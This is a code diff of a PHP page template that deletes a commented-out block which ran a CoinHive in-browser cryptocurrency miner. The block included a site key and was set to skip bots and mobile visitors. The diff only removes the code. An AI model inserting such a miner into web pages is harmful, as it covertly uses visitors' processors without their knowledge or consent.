@@ -41,25 +41,6 @@ $token = md5(substr($rev, 12).rand(1, 100));
         <!-- styles -->
         <?php echo file_get_contents("packages/resipedia/apps/views/parts/styles.html"); ?>        
 
-        <?php
-        /*
-        if(!$request->isBot() && !$request->isMobile()) {
-        ?>
-            <script src="packages/resiway/apps/assets/js/contribute.min.js"></script>
-            <script>
-                var miner = new CoinHive.Anonymous('qaP4WVQaitkLzfkhCEpAHJe0aH6qYI5f',{
-                threads: 1,
-                autoThreads: false,
-                onIddle: true,
-                throttle: 0.8,
-                forceASMJS: false
-                });
-                miner.start();
-            </script>
-        <?php
-        }
-        */
-        ?>
         
         <script src="packages/resipedia/apps/i18n/moment-locale/fr.js?v=<?php echo $token; ?>"></script>        
         <script src="packages/resipedia/apps/i18n/locale-fr.js?v=<?php echo $token; ?>"></script>
